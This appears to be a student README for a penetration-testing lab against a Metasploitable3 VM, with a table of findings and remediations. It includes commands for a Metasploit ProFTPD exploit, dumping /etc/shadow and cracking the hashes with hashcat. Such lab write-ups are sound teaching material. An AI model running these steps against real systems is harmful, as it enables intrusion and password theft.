# 🔍 Penetration Testing & Vulnerability Assessment Lab (Metasploitable3)

## 📌 Overview
This project demonstrates a complete **penetration testing and vulnerability assessment** of a Metasploitable3 (Ubuntu) virtual machine, simulating a real-world attacker scenario using industry-standard tools like **Nmap**, **Nessus**, **Metasploit**, and **Hashcat**.

The goal was to identify, exploit, and assess password security, highlighting critical misconfigurations and offering actionable remediation steps.

> 💼 **Project Type**: Academic Group Project  
> 👩‍💻 **My Contribution**: Performed reconnaissance (Nmap), vulnerability scanning (Nessus), exploitation (Metasploit), and partial post-exploitation (Hash extraction with Hashcat).

---

## 🧰 Tools & Technologies Used

| Tool        | Purpose                                  |
|-------------|------------------------------------------|
| **Nmap**    | Network scanning & service enumeration   |
| **Nessus**  | Vulnerability scanning & impact analysis |
| **Metasploit** | Exploitation & post-exploitation      |
| **Hashcat** | Password hash cracking                   |
| **Kali Linux** | Attacking machine environment         |
| **Metasploitable 3 Ubuntu**  | Victim machine          |
| **VMware**  | Virtual lab setup                        |

---

## 🧪 Lab Setup

- **Target System**: Metasploitable3 (Ubuntu)
- **Attacking System**: Kali Linux (Latest)
- **Network Configuration**: NAT (Local test lab)
- Tools installed and configured on Kali with elevated permissions

---
## 📊 Summary of Key Findings
| Vulnerability                     | Severity | Affected Service          | Recommendation                              |
|----------------------------------|----------|----------------------------|----------------------------------------------|
| ProFTPD RCE (CVE-2015-3306)      | Critical | FTP                        | Update ProFTPD or switch to SFTP             |
| Drupal Coder Module RCE          | Critical | Web CMS                   | Patch Drupal modules                         |
| SQL Injection                    | High     | Drupal CMS                | Use parameterized queries                    |
| Weak SSL Ciphers (3DES)          | High     | TLS Service               | Enforce 128-bit or higher encryption         |
| Deprecated TLS Versions (1.0/1.1)| Medium   | TLS Service               | Upgrade to TLS 1.2+                          |
| Self-Signed/Untrusted Certificates | Medium | Apache HTTP               | Use certificates from a trusted CA           |
| Apache Directory Listing         | Medium   | Apache Web Server         | Disable MultiViews and tighten access rules  |


---

## 🧭 Methodology

1. **Reconnaissance & Scanning**  
   - Identified live hosts and open ports  
   - Enumerated services and operating systems

   ```bash
   sudo nmap -A -p 0-65535 192.168.X.X -o fullnmapscanmetasploitable3ubuntu.txt
   ```
   
2. **Vulnerability Scanning**  
   - Launched Nessus scan against Metasploitable3 VM  
   - Collected and prioritized vulnerability data by CVSS score

3. **Exploitation (Metasploit)**  
   - Gained shell access through known vulnerabilities (e.g., ProFTPD, Drupal RCE)
   - Conducted post-exploitation including file traversal and system info collection

   ```bash
   msfconsole
   use exploit/unix/ftp/proftpd_modcopy_exec
   set RHOST 192.168.X.X
   exploit
   ```

4. **Hash Extraction & Cracking**  
   - Dumped `/etc/passwd` and `/etc/shadow`
   - Combined and cracked hashes using **Hashcat**

   ```bash
   unshadow passwd shadow > combined.txt
   hashcat -m 1800 -a 0 combined.txt rockyou.txt
   ```

---

## 🎓 Lessons Learned

- Developed structured **penetration testing methodology**
- Mastered **multi-tool integration** (Nmap → Nessus → Metasploit → Hashcat)
- Understood how vulnerabilities map to **real-world exploits**
- Practiced secure lab testing and **responsible disclosure** formats
- Gained hands-on experience with **hash analysis and password policy flaws**

---

## ✅ Project Status

- ✅ Completed  
- 🗓️ Date: October 2025  
- 🔒 Confidentiality: Educational Use Only  

---

## ⚠️ Ethical Disclaimer

This project was conducted in a controlled lab using intentionally vulnerable machines for **learning and educational purposes only**. No real systems or unauthorized environments were targeted.
